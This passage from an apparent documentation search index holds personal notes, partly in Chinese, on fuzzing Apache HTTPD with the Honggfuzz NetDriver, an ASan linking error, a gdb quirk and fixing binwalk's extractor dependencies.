\u6700\u8fd1\u5728Honggfuzz\u7684\u4ee3\u7801\u5e93\u4e2d\u5f15\u5165\u7684Honggfuzz\u7f51\u7edc\u9a71\u52a8\u7a0b\u5e8f\u5c31\u8bd5\u56fe\u5b9e\u73b0\u8fd9\u4e9b\u3002 \u9759\u6001\u5e93 [libfhnetdriver/libhfnetdriver.a] \u6e90\u4ee3\u7801 \u9a71\u52a8\u7a0b\u5e8f\u5c06\u81ea\u5df1\u4f5c\u4e3a\u76ee\u6807(\u63d0\u4f9b\u7b26\u53f7)\u63d2\u5165\u5230\u6700\u521d\u7531libFuzzer\u4f5c\u8005\u5b9e\u73b0\u7684\u63a5\u53e3\u4e2d: int LLVMFuzzerTestOneInput ( const uint8_t * buf, size_t len); \u8fd9\u79cd\u9009\u62e9\u4f7f\u5f97\u4e0d\u4ec5\u53ef\u4ee5\u5728honggfuzz\u4e2d\u4f7f\u7528\u8be5\u9a71\u52a8\u7a0b\u5e8f\uff0c\u8fd8\u53ef\u4ee5\u5728AFL\u548clibFuzzer\u4e2d\u4f7f\u7528\u8be5\u9a71\u52a8\u7a0b\u5e8f\u3002\u4ece\u73b0\u5728\u5f00\u59cb\uff0cApache HTTPD\u9879\u76ee\u9700\u8981\u505a\u7684\u552f\u4e00\u4fee\u6539\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u5dee\u5f02: --- a/server/main.c +++ b/server/main.c @@ -484,8 +484,11 @@ static void usage(process_rec *process) destroy_and_exit_process(process, 1); } -int main(int argc, const char * const argv[]) -{ +#ifdef HFND_FUZZING_ENTRY_FUNCTION + HFND_FUZZING_ENTRY_FUNCTION(int argc, const char *const *argv) { +#else + int main(int argc, const char *const *argv) { +#endif char c; int showcompile = 0, showdirectives = 0; const char *confname = SERVER_CONFIG_FILE; \u5e94\u7528\u8fd9\u4e2a\u8865\u4e01\u4e4b\u540e\uff0c main() (\u5c5e\u4e8eApache HTTPD \u4e2dserver/main.c)\u4f1a\u88ab\u7f16\u8bd1\u5668hfuzz-cc\u4e2d\u7684\u5b8f\u66ff\u4ee3\uff08'-D'\u5b9a\u4e49\u5b8f\uff09\uff0c\u8fd9\u4e2a\u6269\u5c55\u5b8f\u5bf9HonggFuzz NetDriver\u6709\u7279\u6b8a\u610f\u4e49--\u8bc6\u522b\u4e3aApache HTTPD\u670d\u52a1\u5668\u4ee3\u7801\u7684\u539f\u59cb\u5165\u53e3\u70b9\u7684\u4f4d\u7f6e \u5728\u5c06TCP server \u94fe\u63a5\u9759\u6001\u5e93libhfnetdriver.a(\u8fd9\u4e00\u6b65\u7531hfuzz-cc/*\u7f16\u8bd1\u5668\u6267\u884c)\u4e4b\u540e\uff0cfuzz\u5f15\u64ce\u4f1a\u8fd0\u884c\u81ea\u5df1\u7684main\u51fd\u6570\uff0c\u7136\u540e\u5728\u4e00\u4e2a\u5355\u72ec\u7684\u7ebf\u7a0b\u4e2d\u8fd0\u884cTCP\u670d\u52a1\u7aef\u4ee3\u7801 \u4e4b\u524d\u63d0\u5230\u7684TCP server \u63a5\u53d7\u5230\u8f93\u5165\u7ed3\u675f\u7684\u4fe1\u53f7\u95ee\u9898\uff08\u6bd4\u5982\u8bf4\u5728fuzzing\u8f93\u5165\u7f13\u51b2\u4e2d\u4e0d\u518d\u6709\u6570\u636e\u65f6\uff0c\u5982\u4f55\u901a\u77e5\u5230TCP server\uff09\uff0c\u53ef\u4ee5\u901a\u8fc7\u5411\u5176\u5efa\u7acb\u7684tcp\u6d41\u4e2d\u53d1\u9001TCP FIN \u5305\u3002\u5728\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0cshutdown(sock, SHUT_WR)\u8fd9\u4e2asyscall\u5b8c\u6210\u4e86\u8fd9\u4e2a\u5de5\u4f5c \u6211\u4eec\u8981\u89e3\u51b3\u7684\u6700\u540e\u4e00\u4e2a\u8981\u6c42\u662f\uff0c\u80fd\u591f\u4f7f\u7528\u76f8\u540c\u7684TCP\u7aef\u53e3\u542f\u52a8\u591a\u4e2aTCP\u670d\u52a1\u5668\u3002\u5f88\u9057\u61be\uff0csetsockopt(SO_REUSEPORT)\u4e0d\u80fd\u7528\u5728\u8fd9\uff0c\u56e0\u4e3a\u6df7\u4e71\u7684\u8f93\u5165\u53ef\u4ee5\u5206\u53d1\u5230\u968f\u673a\u7684fuzz\u8fdb\u7a0b\u7684\u5b9e\u4f8b\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u6709\u4e00\u4e2a\u5f88\u597d\u7684\u65b9\u6cd5\uff1a Linux network namespaces\uff0c\u6b63\u5982\u5b83\u7684\u540d\u5b57\u6240\u8bf4\uff0c\u53ea\u80fd\u7528\u5728linux\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u3002\u5728\u4e0d\u540c\u7684\u7f51\u7edc\u540d\u79f0\u7a7a\u95f4\u4e2d\u8fd0\u884c\u6bcf\u4e2a\u65b0\u7684TCP\u670d\u52a1\u5668\u5141\u8bb8\u5b83\u7ed1\u5b9a\u5230\u4efb\u4f55\u5b83\u5e0c\u671b\u7684TCP\u7aef\u53e3\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u670d\u52a1\u5668\u90fd\u5c06\u770b\u5230\u5c5e\u4e8e\u81ea\u5df1\u7684\u5168\u65b0loopback\u63a5\u53e3\u3002NetDriver \u5229\u7528Linux namespace\u7684\u4ee3\u7801\u53ef\u4ee5\u5728HonggFuzz\u7684libhfcommin\u5e93\u4e2d\u53d1\u73b0\u3002 \u4e00\u65e6TCP server \u542f\u52a8\u5e76\u63a5\u53d7\u65b0\u7684TCP\u8fde\u63a5\uff0cnet dirver \u5c06\uff1a \u5728\u4f60\u9009\u62e9\u7684Fuzzer\u7684\u51c6\u5907\u9636\u6bb5\u8c03\u7528LLVMFuzzerTestOneInput()\u63a5\u53e3\uff1b \u8fde\u63a5TCP server\uff0c \u5411\u5efa\u7acb\u7684TCP\u8fde\u63a5\u53d1\u9001\uff08send()\uff09\u8f93\u5165, \u4f7f\u7528shutdown(sock, SHUT_WR) \u901a\u77e5TCP server \u6ca1\u6709\u66f4\u591a\u7684\u8f93\u5165\u6570\u636e\uff0c \u7b49\u5f85TCP server\u5411\u6211\u4eec\u53d1\u9001\u6570\u636e\uff0c\u76f4\u5230\u5b83\u5173\u95edTCP\u8fde\u63a5\u7684\u4e00\u7aef\u4e3a\u6b62\u3002 \u5173\u95ed\u5ba2\u6237\u7aef\u7684TCP\u8fde\u63a5\u70b9\uff0c \u91cd\u590d\u4e0a\u8ff0\u8fc7\u7a0b \u4e0b\u9762\u7684\u547d\u4ee4\u96c6\u5c06\u5e2e\u52a9\u60a8\u5f00\u59cb\u4f7f\u7528NetDriver\u6765Fuzz\u60a8\u7684\u7b2c\u4e00\u4e2a\u9879\u76ee(\u81f3\u5c11\u5bf9\u4e8eApache HTTPD\u6765\u8bf4)\u3002 ( cd httpd && ./hfuzz.compile_and_install.asan.sh ) honggfuzz -v -Q -f IN/ -w ./httpd.wordlist -- ./httpd/httpd -X -f /home/jagger/fuzz/apache/dist/conf/httpd.conf.h2 ... ... Honggfuzz Net Driver ( pid = 21726 ) : Waiting for the TCP server process to start accepting TCP connections at 127 .0.0.1:8080. Sleeping for 1 second.... Honggfuzz Net Driver ( pid = 21726 ) : The TCP server process is ready to accept connections at 127 .0.0.1:8080. TCP fuzzing starts now! Size:9378 ( i,b,hw,edge,ip,cmp ) : 0 /0/0/4643/110/56364, Tot:0/0/0/4643/110/56364 Size:40712 ( i,b,hw,edge,ip,cmp ) : 0 /0/0/1971/104/21274, Tot:0/0/0/6614/214/77638 ... \u5728\u8fd9\u4e2ahonggfuzz\u76ee\u5f55\u4e2d\u53ef\u4ee5\u627e\u5230\u81ea\u5b9a\u4e49\u7f16\u8bd1\u811a\u672c\uff0c\u4ee5\u53caApache HTTPD\u670d\u52a1\u5668\u6240\u9700\u7684\u6240\u6709\u8865\u4e01\u3001\u914d\u7f6e\u548c\u521d\u59cb\u8bed\u6599\u5e93\u6587\u4ef6\u3002 \u6211\u8ba4\u4e3a\u5c06\u7f51\u7edc\u9a71\u52a8\u7a0b\u5e8f\u4e0elibFuzzer\u548cAFL fuzzing\u8bbe\u7f6e\u96c6\u6210\u8d77\u6765\u5e94\u8be5\u662f\u4e00\u9879\u76f8\u5bf9\u7b80\u5355\u7684\u4efb\u52a1.","title":"honggfuzz"},{"location":"module/fuzzing/honggfuzz/#honggfuzz","text":"","title":"Honggfuzz"},{"location":"module/fuzzing/honggfuzz/#honggfuzz-netdriver","text":"\u5982\u679c\u6211\u4eec\u8981\u5b9e\u73b0\u4e00\u4e2a\u76f8\u5f53\u5065\u58ee\u7684TCP\u670d\u52a1\u7684fuzzing\uff0c\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u6807\u9700\u8981\u505a\u5230\u54ea\u4e9b \u80fd\u4e0e\u73b0\u6709TCP\u670d\u52a1\u96c6\u6210\u7684\u4e00\u5c0f\u6bb5\u4ee3\u7801\uff0c\u6bd4\u5982\u8bf4\uff0c\u4e00\u4e2a\u80fd\u591f\u88abApache\u7684HTTP\u94fe\u63a5\u7684\u9759\u6001\u6216\u52a8\u6001\u5e93\uff0c\uff08\u8fd9\u91cc\u53ef\u4ee5\u4f7fhttpd\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff09 \u5c06\u6765\u81ea\u5185\u5b58\u6570\u7ec4\u548c\u957f\u5ea6\u6807\u8bc6\u7684\u8f93\u5165\u8f6c\u6210TCP\u6d41\u7684\u6280\u672f \u5f53\u8f93\u5165\u7f13\u51b2\u533a\u6ca1\u6709\u4efb\u4f55\u6570\u636e\u65f6\uff0c\u6709\u65b9\u6cd5\u53bb\u901a\u77e5TCP \u670d\u52a1\u7aef\u7ed3\u675f\u8fde\u63a5\uff1b\u5426\u5219TCP\u670d\u52a1\u7aef\u5c06\u4e00\u76f4\u6302\u8d77\uff0c\u6216\u8005\u8d85\u65f6\u4e2d\u65ad\u8fde\u63a5\uff0c\u6216\u8005\u8d85\u8fc7fuzzer\u8bbe\u5b9a\u7684timeout \u5982\u679c\u8bb8\u591a\u76f8\u540c\u7684TCP\u670d\u52a1\u5668\u540c\u65f6\u5728\u76f8\u540c\u7684\u7cfb\u7edf\u4e0a\u8fd0\u884c\uff0c\u914d\u7f6e\u76f8\u540c(\u6216\u8005\u9ed8\u8ba4\u914d\u7f6e)\uff0c\u90a3\u4e48\u5b83\u4eec\u4e5f\u4f1a\u7ed1\u5b9a\u5230\u6570\u5b57\u4e0a\u76f8\u540c\u7684TCP\u7aef\u53e3\u3002\u5f53\u7136\uff0c\u53ea\u6709\u5f53\u6211\u4eec\u6253\u7b97\u540c\u65f6Fuzz\u540c\u4e00\u4e2aTCP\u670d\u52a1\u5668\u7684\u591a\u4e2a\u5b9e\u4f8b\u65f6\uff0c\u8fd9\u624d\u91cd\u8981(\u4f7f\u7528honggfuzz\u53ef\u4ee5\u8f7b\u677e\u505a\u5230\u4ec0\u4e48) \u6700\u8fd1\u5728Honggfuzz\u7684\u4ee3\u7801\u5e93\u4e2d\u5f15\u5165\u7684Honggfuzz\u7f51\u7edc\u9a71\u52a8\u7a0b\u5e8f\u5c31\u8bd5\u56fe\u5b9e\u73b0\u8fd9\u4e9b\u3002 \u9759\u6001\u5e93 [libfhnetdriver/libhfnetdriver.a] \u6e90\u4ee3\u7801 \u9a71\u52a8\u7a0b\u5e8f\u5c06\u81ea\u5df1\u4f5c\u4e3a\u76ee\u6807(\u63d0\u4f9b\u7b26\u53f7)\u63d2\u5165\u5230\u6700\u521d\u7531libFuzzer\u4f5c\u8005\u5b9e\u73b0\u7684\u63a5\u53e3\u4e2d: int LLVMFuzzerTestOneInput ( const uint8_t * buf, size_t len); \u8fd9\u79cd\u9009\u62e9\u4f7f\u5f97\u4e0d\u4ec5\u53ef\u4ee5\u5728honggfuzz\u4e2d\u4f7f\u7528\u8be5\u9a71\u52a8\u7a0b\u5e8f\uff0c\u8fd8\u53ef\u4ee5\u5728AFL\u548clibFuzzer\u4e2d\u4f7f\u7528\u8be5\u9a71\u52a8\u7a0b\u5e8f\u3002\u4ece\u73b0\u5728\u5f00\u59cb\uff0cApache HTTPD\u9879\u76ee\u9700\u8981\u505a\u7684\u552f\u4e00\u4fee\u6539\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u5dee\u5f02: --- a/server/main.c +++ b/server/main.c @@ -484,8 +484,11 @@ static void usage(process_rec *process) destroy_and_exit_process(process, 1); } -int main(int argc, const char * const argv[]) -{ +#ifdef HFND_FUZZING_ENTRY_FUNCTION + HFND_FUZZING_ENTRY_FUNCTION(int argc, const char *const *argv) { +#else + int main(int argc, const char *const *argv) { +#endif char c; int showcompile = 0, showdirectives = 0; const char *confname = SERVER_CONFIG_FILE; \u5e94\u7528\u8fd9\u4e2a\u8865\u4e01\u4e4b\u540e\uff0c main() (\u5c5e\u4e8eApache HTTPD \u4e2dserver/main.c)\u4f1a\u88ab\u7f16\u8bd1\u5668hfuzz-cc\u4e2d\u7684\u5b8f\u66ff\u4ee3\uff08'-D'\u5b9a\u4e49\u5b8f\uff09\uff0c\u8fd9\u4e2a\u6269\u5c55\u5b8f\u5bf9HonggFuzz NetDriver\u6709\u7279\u6b8a\u610f\u4e49--\u8bc6\u522b\u4e3aApache HTTPD\u670d\u52a1\u5668\u4ee3\u7801\u7684\u539f\u59cb\u5165\u53e3\u70b9\u7684\u4f4d\u7f6e \u5728\u5c06TCP server \u94fe\u63a5\u9759\u6001\u5e93libhfnetdriver.a(\u8fd9\u4e00\u6b65\u7531hfuzz-cc/*\u7f16\u8bd1\u5668\u6267\u884c)\u4e4b\u540e\uff0cfuzz\u5f15\u64ce\u4f1a\u8fd0\u884c\u81ea\u5df1\u7684main\u51fd\u6570\uff0c\u7136\u540e\u5728\u4e00\u4e2a\u5355\u72ec\u7684\u7ebf\u7a0b\u4e2d\u8fd0\u884cTCP\u670d\u52a1\u7aef\u4ee3\u7801 \u4e4b\u524d\u63d0\u5230\u7684TCP server \u63a5\u53d7\u5230\u8f93\u5165\u7ed3\u675f\u7684\u4fe1\u53f7\u95ee\u9898\uff08\u6bd4\u5982\u8bf4\u5728fuzzing\u8f93\u5165\u7f13\u51b2\u4e2d\u4e0d\u518d\u6709\u6570\u636e\u65f6\uff0c\u5982\u4f55\u901a\u77e5\u5230TCP server\uff09\uff0c\u53ef\u4ee5\u901a\u8fc7\u5411\u5176\u5efa\u7acb\u7684tcp\u6d41\u4e2d\u53d1\u9001TCP FIN \u5305\u3002\u5728\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0cshutdown(sock, SHUT_WR)\u8fd9\u4e2asyscall\u5b8c\u6210\u4e86\u8fd9\u4e2a\u5de5\u4f5c \u6211\u4eec\u8981\u89e3\u51b3\u7684\u6700\u540e\u4e00\u4e2a\u8981\u6c42\u662f\uff0c\u80fd\u591f\u4f7f\u7528\u76f8\u540c\u7684TCP\u7aef\u53e3\u542f\u52a8\u591a\u4e2aTCP\u670d\u52a1\u5668\u3002\u5f88\u9057\u61be\uff0csetsockopt(SO_REUSEPORT)\u4e0d\u80fd\u7528\u5728\u8fd9\uff0c\u56e0\u4e3a\u6df7\u4e71\u7684\u8f93\u5165\u53ef\u4ee5\u5206\u53d1\u5230\u968f\u673a\u7684fuzz\u8fdb\u7a0b\u7684\u5b9e\u4f8b\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u6709\u4e00\u4e2a\u5f88\u597d\u7684\u65b9\u6cd5\uff1a Linux network namespaces\uff0c\u6b63\u5982\u5b83\u7684\u540d\u5b57\u6240\u8bf4\uff0c\u53ea\u80fd\u7528\u5728linux\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u3002\u5728\u4e0d\u540c\u7684\u7f51\u7edc\u540d\u79f0\u7a7a\u95f4\u4e2d\u8fd0\u884c\u6bcf\u4e2a\u65b0\u7684TCP\u670d\u52a1\u5668\u5141\u8bb8\u5b83\u7ed1\u5b9a\u5230\u4efb\u4f55\u5b83\u5e0c\u671b\u7684TCP\u7aef\u53e3\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u670d\u52a1\u5668\u90fd\u5c06\u770b\u5230\u5c5e\u4e8e\u81ea\u5df1\u7684\u5168\u65b0loopback\u63a5\u53e3\u3002NetDriver \u5229\u7528Linux namespace\u7684\u4ee3\u7801\u53ef\u4ee5\u5728HonggFuzz\u7684libhfcommin\u5e93\u4e2d\u53d1\u73b0\u3002 \u4e00\u65e6TCP server \u542f\u52a8\u5e76\u63a5\u53d7\u65b0\u7684TCP\u8fde\u63a5\uff0cnet dirver \u5c06\uff1a \u5728\u4f60\u9009\u62e9\u7684Fuzzer\u7684\u51c6\u5907\u9636\u6bb5\u8c03\u7528LLVMFuzzerTestOneInput()\u63a5\u53e3\uff1b \u8fde\u63a5TCP server\uff0c \u5411\u5efa\u7acb\u7684TCP\u8fde\u63a5\u53d1\u9001\uff08send()\uff09\u8f93\u5165, \u4f7f\u7528shutdown(sock, SHUT_WR) \u901a\u77e5TCP server \u6ca1\u6709\u66f4\u591a\u7684\u8f93\u5165\u6570\u636e\uff0c \u7b49\u5f85TCP server\u5411\u6211\u4eec\u53d1\u9001\u6570\u636e\uff0c\u76f4\u5230\u5b83\u5173\u95edTCP\u8fde\u63a5\u7684\u4e00\u7aef\u4e3a\u6b62\u3002 \u5173\u95ed\u5ba2\u6237\u7aef\u7684TCP\u8fde\u63a5\u70b9\uff0c \u91cd\u590d\u4e0a\u8ff0\u8fc7\u7a0b \u4e0b\u9762\u7684\u547d\u4ee4\u96c6\u5c06\u5e2e\u52a9\u60a8\u5f00\u59cb\u4f7f\u7528NetDriver\u6765Fuzz\u60a8\u7684\u7b2c\u4e00\u4e2a\u9879\u76ee(\u81f3\u5c11\u5bf9\u4e8eApache HTTPD\u6765\u8bf4)\u3002 ( cd httpd && ./hfuzz.compile_and_install.asan.sh ) honggfuzz -v -Q -f IN/ -w ./httpd.wordlist -- ./httpd/httpd -X -f /home/jagger/fuzz/apache/dist/conf/httpd.conf.h2 ... ... Honggfuzz Net Driver ( pid = 21726 ) : Waiting for the TCP server process to start accepting TCP connections at 127 .0.0.1:8080. Sleeping for 1 second.... Honggfuzz Net Driver ( pid = 21726 ) : The TCP server process is ready to accept connections at 127 .0.0.1:8080. TCP fuzzing starts now! Size:9378 ( i,b,hw,edge,ip,cmp ) : 0 /0/0/4643/110/56364, Tot:0/0/0/4643/110/56364 Size:40712 ( i,b,hw,edge,ip,cmp ) : 0 /0/0/1971/104/21274, Tot:0/0/0/6614/214/77638 ... \u5728\u8fd9\u4e2ahonggfuzz\u76ee\u5f55\u4e2d\u53ef\u4ee5\u627e\u5230\u81ea\u5b9a\u4e49\u7f16\u8bd1\u811a\u672c\uff0c\u4ee5\u53caApache HTTPD\u670d\u52a1\u5668\u6240\u9700\u7684\u6240\u6709\u8865\u4e01\u3001\u914d\u7f6e\u548c\u521d\u59cb\u8bed\u6599\u5e93\u6587\u4ef6\u3002 \u6211\u8ba4\u4e3a\u5c06\u7f51\u7edc\u9a71\u52a8\u7a0b\u5e8f\u4e0elibFuzzer\u548cAFL fuzzing\u8bbe\u7f6e\u96c6\u6210\u8d77\u6765\u5e94\u8be5\u662f\u4e00\u9879\u76f8\u5bf9\u7b80\u5355\u7684\u4efb\u52a1.","title":"Honggfuzz NetDriver"},{"location":"module/fuzzing/libfuzzer/","text":"libfuzzer \u00b6 libfuzzer for gcc \u00b6 Add Better Support for AFL/gcc \u95ee\u9898 \u00b6 Your application is linked against incompatible ASan runtimes. \u53ef\u80fd\u662flink\u5bfc\u81f4\u7684,\u6309\u7167\u4e0b\u9762\u7684\u8bf4\u6cd5\uff0c\u9759\u6001\u7f16\u8bd1\u7248\u672c\u7684\u9879\u76ee\u540c\u65f6link\u4e86libasan.so\u4e5f\u4f1a\u62a5\u9519 // ref https://lists.gnu.org/archive/html/libtool/2017-01/msg00008.html Hello list, I was getting the following error message after building with CFLAGS = ' - fsanitize = address - static - libasan ' LDFLAGS =- static - libasan and trying to run the generated executable. == 5331 == Your application is linked against incompatible ASan runtimes. Please note that the project also contains a shared library, which libtool was always linking while ignoring the \"-static-libasan\" flag. So the library was linking to \"libasan.so\" while the binaries were linked with the static runtime. The attached patch on the generated libtool script solved the issue to me. Feel free to use it upstream, if it makes sense. Thanks, Dimitris \u786e\u5b9a\u4e86\uff0c\u786e\u5b9e\u662f\u8fd9\u4e2a\u95ee\u9898 target_compile_options( you_target PUBLIC -static-libasan )","title":"libfuzzer"},{"location":"module/fuzzing/libfuzzer/#libfuzzer","text":"","title":"libfuzzer"},{"location":"module/fuzzing/libfuzzer/#libfuzzer-for-gcc","text":"Add Better Support for AFL/gcc","title":"libfuzzer for gcc"},{"location":"module/fuzzing/libfuzzer/#_1","text":"Your application is linked against incompatible ASan runtimes. \u53ef\u80fd\u662flink\u5bfc\u81f4\u7684,\u6309\u7167\u4e0b\u9762\u7684\u8bf4\u6cd5\uff0c\u9759\u6001\u7f16\u8bd1\u7248\u672c\u7684\u9879\u76ee\u540c\u65f6link\u4e86libasan.so\u4e5f\u4f1a\u62a5\u9519 // ref https://lists.gnu.org/archive/html/libtool/2017-01/msg00008.html Hello list, I was getting the following error message after building with CFLAGS = ' - fsanitize = address - static - libasan ' LDFLAGS =- static - libasan and trying to run the generated executable. == 5331 == Your application is linked against incompatible ASan runtimes. Please note that the project also contains a shared library, which libtool was always linking while ignoring the \"-static-libasan\" flag. So the library was linking to \"libasan.so\" while the binaries were linked with the static runtime. The attached patch on the generated libtool script solved the issue to me. Feel free to use it upstream, if it makes sense. Thanks, Dimitris \u786e\u5b9a\u4e86\uff0c\u786e\u5b9e\u662f\u8fd9\u4e2a\u95ee\u9898 target_compile_options( you_target PUBLIC -static-libasan )","title":"\u95ee\u9898"},{"location":"module/gdb/issues/","text":"gdb \u00b6 inline function \u00b6 \u5728inline\u51fd\u6570\u5d29\u6e83\uff0cgdb \u65ad\u5728\u4e0a\u5c42\u51fd\u6570\uff0c\u4f46\u662fni\u540esource\u663e\u793a\u5230\u4e86\u6b63\u786e\u4f4d\u7f6e\uff08inline function\uff09\uff0c\u6709\u610f\u601d","title":"gdb issues"},{"location":"module/gdb/issues/#gdb","text":"","title":"gdb"},{"location":"module/gdb/issues/#inline-function","text":"\u5728inline\u51fd\u6570\u5d29\u6e83\uff0cgdb \u65ad\u5728\u4e0a\u5c42\u51fd\u6570\uff0c\u4f46\u662fni\u540esource\u663e\u793a\u5230\u4e86\u6b63\u786e\u4f4d\u7f6e\uff08inline function\uff09\uff0c\u6709\u610f\u601d","title":"inline function"},{"location":"module/iot/binwalk/","text":"binwalk \u00b6 issues \u00b6 failed to run external extractor 'sasquatch -p 1 -le -d 'squashfs-root' \u00b6 description \u00b6 Miss binary sasquatch DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 DLOB firmware header, boot partition: \"dev=/dev/mtdblock/1\" 112 0x70 LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4624518 bytes 1441904 0x160070 PackImg section delimiter tag, little endian size: 2131456 bytes; big endian size: 8790016 bytes WARNING: Extractor.execute failed to run external extractor 'sasquatch -p 1 -le -d 'squashfs-root' '%e'': [Errno 2] No such file or directory: 'sasquatch': 'sasquatch', 'sasquatch -p 1 -le -d 'squashfs-root' '%e'' might not be installed correctly WARNING: Extractor.execute failed to run external extractor 'sasquatch -p 1 -be -d 'squashfs-root' '%e'': [Errno 2] No such file or directory: 'sasquatch': 'sasquatch', 'sasquatch -p 1 -be -d 'squashfs-root' '%e'' might not be installed correctly 1441936 0x160090 Squashfs filesystem, little endian, non-standard signature, version 3.0, size: 8789043 bytes, 2427 inodes, blocksize: 65536 bytes, created: 2012-11-02 04:51:50 solution \u00b6 cd /path/to/directory git https://github.com/devttys0/ .git cd sasquatch ./build # Phaaga , failed to build due to network error # vim build.sh # if [ ! -e squashfs4.3.tar.gz ] # then # wget https://nchc.dl.sourceforge.net/project/squashfs/squashfs/squashfs4.3/squashfs4.3.tar.gz # #wget https://downloads.sourceforge.net/project/squashfs/squashfs/squashfs4.3/squashfs4.3.tar.gz # fi failed to find lzma in python2 virtualenv \u00b6 WARNING: The Python LZMA module could not be found. It is *strongly* recommended that you install this module for binwalk to provide proper LZMA identification and extraction results. WARNING: The Python LZMA module could not be found. It is *strongly* recommended that you install this module for binwalk to provide proper LZMA identification and extraction results. solution # workon virtualenv pip install pyliblzma # It`s not the 'pylzma' binwalk in python virtualenv \u00b6 After installing binwalk for python3, need to install binwalk (python2) for FAT. solution Warnning: It only contain python2 environment. \u66f4\u65b9\u4fbf\u7684\u65b9\u6cd5\uff0c\u5728root\u4e0b\u8fdb\u5165python\u865a\u73af\u5883\u540e\u6267\u884cbinwalk\u5b89\u88c5\u811a\u672c # workon virtua_ env sudo apt-get install git build-essential libqt4-opengl mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsswap squashfs-tools zlib1g-dev liblzma-dev liblzo2-dev sleuthkit default-jdk lzop srecord cpio sudo apt-get install python-crypto python-lzo python-lzma python-pip python-tk pip install matplotlib capstone git clone https://github.com/devttys0/yaffshiv ( cd yaffshiv && python2 setup.py install ) rm -rf yaffshiv # install_sasquatch for local bin, not python2 package git clone https://github.com/sviehb/jefferson ( cd jefferson && python2 setup.py install ) rm -rf jefferson # install_unstuff , install_cramfstools installed in /usr/local/bin, not python2 package git clone https://github.com/jrspruitt/ubi_reader ( cd ubi_reader && git reset --hard 0955e6b95f07d849a182125919a1f2b6790d5b51 && python setup.py install ) rm -rf ubi_reader","title":"binwalk"},{"location":"module/iot/binwalk/#binwalk","text":"","title":"binwalk"},{"location":"module/iot/binwalk/#issues","text":"","title":"issues"},{"location":"module/iot/binwalk/#failed-to-run-external-extractor-sasquatch-p-1-le-d-squashfs-root","text":"","title":"failed to run external extractor 'sasquatch -p 1 -le -d 'squashfs-root'"},{"location":"module/iot/binwalk/#description","text":"Miss binary sasquatch DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 DLOB firmware header, boot partition: \"dev=/dev/mtdblock/1\" 112 0x70 LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4624518 bytes 1441904 0x160070 PackImg section delimiter tag, little endian size: 2131456 bytes; big endian size: 8790016 bytes WARNING: Extractor.execute failed to run external extractor 'sasquatch -p 1 -le -d 'squashfs-root' '%e'': [Errno 2] No such file or directory: 'sasquatch': 'sasquatch', 'sasquatch -p 1 -le -d 'squashfs-root' '%e'' might not be installed correctly WARNING: Extractor.execute failed to run external extractor 'sasquatch -p 1 -be -d 'squashfs-root' '%e'': [Errno 2] No such file or directory: 'sasquatch': 'sasquatch', 'sasquatch -p 1 -be -d 'squashfs-root' '%e'' might not be installed correctly 1441936 0x160090 Squashfs filesystem, little endian, non-standard signature, version 3.0, size: 8789043 bytes, 2427 inodes, blocksize: 65536 bytes, created: 2012-11-02 04:51:50","title":"description"},{"location":"module/iot/binwalk/#solution","text":"cd /path/to/directory git https://github.com/devttys0/ .git cd sasquatch ./build # Phaaga , failed to build due to network error # vim build.sh # if [ ! -e squashfs4.3.tar.gz ] # then # wget https://nchc.dl.sourceforge.net/project/squashfs/squashfs/squashfs4.3/squashfs4.3.tar.gz # #wget https://downloads.sourceforge.net/project/squashfs/squashfs/squashfs4.3/squashfs4.3.tar.gz # fi","title":"solution"},{"location":"module/iot/binwalk/#failed-to-find-lzma-in-python2-virtualenv","text":"WARNING: The Python LZMA module could not be found. It is *strongly* recommended that you install this module for binwalk to provide proper LZMA identification and extraction results. WARNING: The Python LZMA module could not be found. It is *strongly* recommended that you install this module for binwalk to provide proper LZMA identification and extraction results. solution # workon virtualenv pip install pyliblzma # It`s not the 'pylzma'","title":"failed to find lzma in python2 virtualenv"},{"location":"module/iot/binwalk/#binwalk-in-python-virtualenv","text":"After installing binwalk for python3, need to install binwalk (python2) for FAT. solution Warnning: It only contain python2 environment. \u66f4\u65b9\u4fbf\u7684\u65b9\u6cd5\uff0c\u5728root\u4e0b\u8fdb\u5165python\u865a\u73af\u5883\u540e\u6267\u884cbinwalk\u5b89\u88c5\u811a\u672c # workon virtua_ env sudo apt-get install git build-essential libqt4-opengl mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsswap squashfs-tools zlib1g-dev liblzma-dev liblzo2-dev sleuthkit default-jdk lzop srecord cpio sudo apt-get install python-crypto python-lzo python-lzma python-pip python-tk pip install matplotlib capstone git clone https://github.com/devttys0/yaffshiv ( cd yaffshiv && python2 setup.py install ) rm -rf yaffshiv # install_sasquatch for local bin, not python2 package git clone https://github.com/sviehb/jefferson ( cd jefferson && python2 setup.py install ) rm -rf jefferson # install_unstuff , install_cramfstools installed in /usr/local/bin, not python2 package git clone https://github.com/jrspruitt/ubi_reader ( cd ubi_reader && git reset --hard 0955e6b95f07d849a182125919a1f2b6790d5b51 && python setup.py install ) rm -rf ubi_reader","title":"binwalk in python virtualenv"},{"location":"module/kernel/kernel-debug/","text":"debug kernel \u00b6 debug ubuntu kernel \u00b6 Download kernel debug symbol \u00b6 